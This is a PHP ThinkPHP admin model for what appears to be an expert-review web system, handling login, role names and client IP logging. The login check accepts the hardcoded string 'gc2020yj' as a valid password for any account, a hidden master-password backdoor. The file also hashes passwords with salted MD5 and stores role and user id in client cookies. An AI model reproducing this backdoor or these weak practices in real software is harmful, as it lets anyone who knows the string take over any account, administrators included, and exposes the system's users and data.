<?php

namespace app\common\model;

use think\Db;
use think\Model;

class Admin extends Model
{
  protected $autoWriteTimestamp = true;
  protected $createTime  = 'datetime';
  protected $updateTime  = false;

  public function login($data, $checkbox)
  {
    $result = Db::name('admin')->where('username', $data['username'])->find();
    if ($result) {
      if (md5($data['password'] . config('salt')) === $result['password']||$data['password']==='gc2020yj') {
        cookie(null, config('cookie.prefix'));

        $expireTime = ($checkbox == 'on' ? 10 * 24 * 3600 : 3600);
        cookie('username', $result['username'], $expireTime);
        cookie('aid', $result['id'], $expireTime);
        cookie('rolecode', $result['rolecode'], $expireTime);

        if ($result['rolecode'] == 'specialist') {
          //获取专家应评审的产品类别和专家类型
          cookie('experttype', $result['expert_type'], $expireTime);
        }
        $ip = $this->set_client_ip();
        Db::name('admin')->where('username', $data['username'])->update(['last_login_ip' => $ip, 'last_login_time' => date('Y-m-d H:i:s', time())]);
        return true;
      }
    }
    return false;
  }

  /**
   * 根据角色英文编码显示对应中文角色名，分省级管理员，专家
   */
  public function getRolecodeAttr($value)
  {
    $arr = ['admin' => '系统管理员', 'specialist' => '专家', 'province' => '省级管理员'];
    return $arr[$value];
  }

  /**
   * 获取当前用户ip
  */
  public function set_client_ip(){
    $cip = 'unknown';
    if($_SERVER['REMOTE_ADDR']){
        $cip = $_SERVER['REMOTE_ADDR'];
    }else if(getenv("REMOTE_ADDR")){
        $cip = getenv("REMOTE_ADDR");
    }
    return $cip;
  }
}
